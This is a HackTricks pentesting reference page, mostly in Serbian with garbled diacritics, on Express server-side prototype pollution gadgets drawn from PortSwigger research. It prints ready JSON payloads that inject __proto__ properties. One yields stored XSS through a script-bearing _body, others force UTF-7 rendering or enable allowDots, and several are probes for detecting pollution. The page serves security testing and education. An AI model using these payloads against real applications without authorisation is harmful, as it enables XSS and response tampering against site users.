# Express Prototype Pollution Gadgets

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Serve XSS responses

**Za viÅ¡e detalja** [**pogledajte originalno istraÅ¾ivanje**](https://portswigger.net/research/server-side-prototype-pollution)

### Promenite JSON content-type u HTML

U Express aplikaciji koja koristi **JSON content type response** i reflektuje JSON:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
U ovim sluÄajevima XSS obiÄno nije moguÄ‡ sa JSON tipom sadrÅ¾aja. MeÄ‘utim, sa zagaÄ‘enjem prototipa moÅ¾emo **zbuniti Express da vrati HTML odgovor.** Ova ranjivost se oslanja na aplikaciju koja koristi **`res.send(obj)`** i koristi parser tela sa tipom sadrÅ¾aja application/json.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
By **polluting** **`body`** and **`_body`** properties, it's possible to cause **Express to serve up the HTML content type** and reflect the `_body` property, resulting in stored XSS.

### Render UTF7

MoguÄ‡e je naterati express da **prikazuje UTF-7 sadrÅ¾aj sa**:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## Tehnike bezbednog skeniranja

### JSON razmaci

SledeÄ‡i PP Ä‡e dodati dodatni razmak unutar JSON atributa koji neÄ‡e pokvariti funkcionalnost:
```json
{"__proto__":{"json spaces": " "}}
```
Tada Ä‡e reflektovani JSON izgledati ovako:
```json
{"foo":  "bar"} -- Note the extra space
```
### IzloÅ¾eni Headeri

SledeÄ‡i PP gadget Ä‡e naterati server da vrati HTTP header: **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
Zahteva se da **CORS modul bude instaliran**

### **OPTIONS Metoda**

Sa sledeÄ‡im payload-om, moguÄ‡e je **sakriti metodu iz OPTIONS odgovora**:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Status**

MoguÄ‡e je promeniti **vratni status kod** koristeÄ‡i sledeÄ‡i PP payload:
```json
{"__proto__":{"status":510}}
```
### GreÅ¡ka

Kada dodelite prototipu primitivnu vrednost kao Å¡to je string, to proizvodi **operaciju bez efekta jer prototip mora biti objekat**. Ako pokuÅ¡ate da dodelite objekat prototipa samom `Object.prototype`, to Ä‡e **izazvati izuzetak**. MoÅ¾emo koristiti ova dva ponaÅ¡anja da **otkrijemo da li je zagaÄ‘enje prototipa bilo uspeÅ¡no**:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### Reflected Value

Kada aplikacija ukljuÄuje objekat u svoj odgovor, kreiranje atributa sa **neobiÄnim imenom pored `__proto__`** moÅ¾e biti korisno. Konkretno, ako **samo neobiÄni atribut bude vraÄ‡en** u odgovoru, to moÅ¾e ukazivati na ranjivost aplikacije:
```json
{"unusualName":"value","__proto__":"test"}
```
Pored toga, u scenarijima gde se koristi biblioteka kao Å¡to je Lodash, postavljanje svojstva kako putem zagaÄ‘enja prototipa (PP) tako i direktno unutar objekta nudi joÅ¡ jedan dijagnostiÄki pristup. Ako je takvo svojstvo izostavljeno iz odgovora, to sugeriÅ¡e da Lodash proverava postojanje svojstva u ciljanom objektu pre nego Å¡to ga spoji:
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## Razno

### Dozvoli taÄke

Postoji opcija u Express-u koja vam omoguÄ‡ava da **kreirate objekte iz parametara upita**.\
Definitivno je moÅ¾ete koristiti u **lancu** greÅ¡aka za iskoriÅ¡Ä‡avanje **ranjivosti zagaÄ‘enja prototipa**.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` kreira objekat u Node.**

## Reference

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)


{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
